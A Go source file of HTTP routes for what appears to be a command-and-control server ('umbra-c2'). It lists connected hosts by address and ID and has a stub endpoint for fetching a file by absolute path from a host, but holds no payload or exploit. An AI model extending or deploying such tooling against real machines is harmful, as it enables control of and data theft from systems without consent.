package routes

import (
	"net/http"
	"path"
	"umbra-c2/c2"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

type Host struct {
	Address string
	Id      uuid.UUID
}

func newHost(c *c2.C2Client) Host {
	return Host{
		Address: c.Conn.RemoteAddr().String(),
		Id:      c.Id,
	}
}

func GetHosts(c *gin.Context) {
	hosts := make([]Host, 0, len(c2.Clients))
	for _, client := range c2.Clients {
		hosts = append(hosts, newHost(client))
	}

	c.JSON(http.StatusOK, hosts)
}

func HostMiddleware(c *gin.Context) {
	id, err := uuid.Parse(c.Param("id"))

	if err != nil {
		c.AbortWithStatus(http.StatusNotFound)
	} else {
		c.Set("id", id)
		c.Next()
	}
}

func GetHost(c *gin.Context) {
	id, ok := c.MustGet("id").(uuid.UUID)

	if !ok {
		c.Status(http.StatusInternalServerError)
		return
	}

	if client, ok := c2.Clients[id]; ok {
		c.JSON(http.StatusOK, newHost(client))
	} else {
		c.Status(http.StatusNotFound)
	}
}

func GetHostFile(c *gin.Context) {
	id, ok := c.MustGet("id").(uuid.UUID)

	if !ok {
		c.Status(http.StatusInternalServerError)
		return
	}

	filePath, _ := c.GetQuery("path")

	if filePath == "" {
		c.Status(http.StatusBadRequest)
		return
	}

	if path.IsAbs(filePath) {
		if _, ok := c2.Clients[id]; ok {
			c.Status(http.StatusOK)
		} else {
			c.Status(http.StatusNotFound)
		}
	} else {
		c.Status(http.StatusBadRequest)
	}
}
